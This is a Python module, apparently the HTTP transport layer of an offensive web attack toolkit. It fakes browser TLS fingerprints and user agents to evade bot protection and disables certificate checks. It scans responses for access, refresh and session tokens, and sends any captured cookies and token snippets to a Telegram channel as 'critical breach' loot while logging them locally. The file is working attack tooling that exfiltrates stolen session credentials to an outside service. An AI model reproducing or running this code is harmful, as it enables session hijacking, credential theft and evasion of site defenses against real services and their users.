#!/usr/bin/env python3
"""
TRANSPORT.PY v8.8 — Centralized HTTP Transport & Session Cookie Middleware
"""
import asyncio
import hashlib
import http.client
import inspect
import json
import random
import socket
import ssl
import time
from urllib.parse import urlsplit

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof
from modules.tls_evasion import AdversarialTLSSession, CFFI_AVAILABLE, create_spoofed_ssl_context

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
]

HIGH_VALUE_KEYWORDS = [
    "critical",
    "bypass",
    "success",
    "loot",
    "token",
    "session",
    "admin",
    "credential",
    "compromised",
    "race",
    "pivot",
    "jwt",
    "dump",
]

SESSION_FIELD_MARKERS = (
    '"access_token"',
    '"auth_token"',
    '"session_id"',
    '"refresh_token"',
)

COOKIE_ATTRIBUTES = {
    "path",
    "expires",
    "domain",
    "samesite",
    "secure",
    "httponly",
    "max-age",
    "partitioned",
}

_background_tasks: set[asyncio.Task] = set()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await asyncio.wait_for(
                send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details),
                timeout=8,
            )
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    """Schedules notifications non-blockingly when invoked from synchronous code."""
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


def _is_html_or_challenge(body: str, headers: dict) -> bool:
    text = body or ""
    lower = text.lower()
    ctype = str(headers.get("content-type", "")).lower()
    if "application/json" in ctype or "application/problem+json" in ctype:
        return False
    return any(
        marker in lower
        for marker in (
            "<!doctype html",
            "<html",
            '<div id="root">',
            '<div id="__next">',
            "<title>security check</title>",
            "cf-browser-verification",
            "attention required!",
        )
    )


class SecureTransport:
    def __init__(self, target_url, browser_profile="chrome120", timeout=6):
        parsed = urlsplit(target_url)
        self.target_url = target_url
        self.host = parsed.hostname
        self.secure = parsed.scheme == "https"
        self.port = parsed.port or (443 if self.secure else 80)
        self.base_path = (parsed.path or "").rstrip("/")
        self.timeout = timeout
        self.cookie_jar: dict[str, str] = {}
        self._consecutive_net_errors = 0

        self.adversarial_tls = AdversarialTLSSession(self.host, browser_profile=browser_profile)
        self.cffi_session = self.adversarial_tls.get_impersonated_session() if CFFI_AVAILABLE else None

    def close(self):
        for obj in (self.cffi_session, self.adversarial_tls):
            close_fn = getattr(obj, "close", None) or getattr(obj, "aclose", None)
            if callable(close_fn):
                try:
                    res = close_fn()
                    if not inspect.isawaitable(res):
                        pass
                except Exception:
                    pass

    def update_cookies(self, set_cookie_header):
        if not set_cookie_header:
            return
        if isinstance(set_cookie_header, dict):
            for k, v in set_cookie_header.items():
                if str(k).strip().lower() not in COOKIE_ATTRIBUTES:
                    self.cookie_jar[str(k).strip()] = str(v).strip()
            return

        if isinstance(set_cookie_header, str):
            for segment in set_cookie_header.split(";"):
                part = segment.strip()
                if "=" not in part:
                    continue
                k, v = part.split("=", 1)
                k_clean = k.strip()
                if k_clean.lower() not in COOKIE_ATTRIBUTES and k_clean:
                    self.cookie_jar[k_clean] = v.strip()

    def get_cookie_header_value(self):
        if not self.cookie_jar:
            return ""
        return "; ".join([f"{k}={v}" for k, v in self.cookie_jar.items()])

    def _compute_backoff(self, attempt: int, headers: dict | None = None) -> float:
        if isinstance(headers, dict) and "retry-after" in headers:
            raw_ra = str(headers["retry-after"]).strip()
            if raw_ra.isdigit():
                return min(float(raw_ra), 3.0)
        return min(0.2 * (2 ** attempt) + random.uniform(0.02, 0.12), 2.0)

    def _record_session_artifact(self, full_url, path, method, status, resp_headers, data):
        text = data or ""
        body_lower = text.lower()
        if (
            status in (200, 201)
            and not _is_html_or_challenge(text, resp_headers)
            and any(marker in body_lower for marker in SESSION_FIELD_MARKERS)
        ):
            loot_hash = hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()
            transport_loot = {
                "endpoint": full_url,
                "status": status,
                "integrity_hash": loot_hash,
                "cookie_jar": self.get_cookie_header_value(),
                "response_snippet": text[:300],
            }
            broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
            stream_proof(
                "TRANSPORT_SESSION_CAPTURE",
                full_url,
                {"method": method, "hash": loot_hash},
                text[:300],
                transport_loot,
            )
            save_session_loot(
                target=self.target_url,
                endpoint=path,
                finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
                status=status,
                headers=resp_headers,
                body=text,
                extra_loot=transport_loot,
            )

    def request(self, method, path, payload=None, extra_headers=None, retries=1):
        if not self.host:
            return 0, {}, ""

        if self._consecutive_net_errors >= 8:
            return 0, {}, ""

        apply_behavioral_jitter()

        clean_path = str(path or "/")
        if not clean_path.startswith("http") and not clean_path.startswith("/"):
            clean_path = "/" + clean_path

        endpoint = (
            f"{self.base_path}{clean_path}"
            if self.base_path and not clean_path.startswith(self.base_path)
            else clean_path
        )
        full_url = (
            clean_path
            if clean_path.startswith("http")
            else f"{self.target_url.rstrip('/')}{endpoint}"
        )

        max_attempts = max(1, int(retries or 1))
        verb = (method or "GET").upper()

        if self.cffi_session and self.secure:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            }
            headers.update(get_randomized_hints())
            cookie_str = self.get_cookie_header_value()
            if cookie_str:
                headers["Cookie"] = cookie_str
            if extra_headers:
                headers.update(extra_headers)

            for attempt in range(max_attempts):
                try:
                    if verb == "GET":
                        res = self.cffi_session.get(full_url, headers=headers, timeout=self.timeout, verify=False)
                    elif verb == "POST":
                        res = self.cffi_session.post(full_url, json=payload, headers=headers, timeout=self.timeout, verify=False)
                    elif verb == "PUT":
                        res = self.cffi_session.put(full_url, json=payload, headers=headers, timeout=self.timeout, verify=False)
                    else:
                        res = self.cffi_session.request(verb, full_url, json=payload, headers=headers, timeout=self.timeout, verify=False)

                    self._consecutive_net_errors = 0
                    resp_headers = {str(k).lower(): v for k, v in (res.headers or {}).items()}
                    if "set-cookie" in resp_headers:
                        self.update_cookies(resp_headers["set-cookie"])

                    data = res.text or ""
                    if res.status_code in (429, 503) and attempt < max_attempts - 1:
                        time.sleep(self._compute_backoff(attempt, resp_headers))
                        continue

                    self._record_session_artifact(full_url, path, verb, res.status_code, resp_headers, data)
                    return res.status_code, resp_headers, data

                except Exception:
                    self._consecutive_net_errors += 1
                    if attempt < max_attempts - 1:
                        time.sleep(self._compute_backoff(attempt))
                        continue
                    break

        headers = {
            "Host": self.host,
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close",
        }
        headers.update(get_randomized_hints())

        cookie_str = self.get_cookie_header_value()
        if cookie_str:
            headers["Cookie"] = cookie_str

        if extra_headers:
            headers.update(extra_headers)

        body = None
        if payload is not None:
            body = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"

        for attempt in range(max_attempts):
            conn = None
            try:
                if self.secure:
                    ctx = create_spoofed_ssl_context(self.host)
                    conn = http.client.HTTPSConnection(self.host, self.port, timeout=self.timeout, context=ctx)
                else:
                    conn = http.client.HTTPConnection(self.host, self.port, timeout=self.timeout)

                conn.request(verb, endpoint, body=body, headers=headers)
                res = conn.getresponse()
                data = res.read(512 * 1024).decode("utf-8", errors="replace")
                resp_headers = {str(k).lower(): v for k, v in res.getheaders()}
                self._consecutive_net_errors = 0

                if "set-cookie" in resp_headers:
                    self.update_cookies(resp_headers["set-cookie"])

                if res.status in (429, 503) and attempt < max_attempts - 1:
                    time.sleep(self._compute_backoff(attempt, resp_headers))
                    continue

                self._record_session_artifact(full_url, path, verb, res.status, resp_headers, data)
                return res.status, resp_headers, data

            except (ssl.SSLError, socket.timeout, ConnectionError, OSError):
                self._consecutive_net_errors += 1
                if attempt < max_attempts - 1:
                    time.sleep(self._compute_backoff(attempt))
                    continue
                return 0, {}, ""
            except Exception:
                self._consecutive_net_errors += 1
                return 0, {}, ""
            finally:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        pass

        return 0, {}, ""
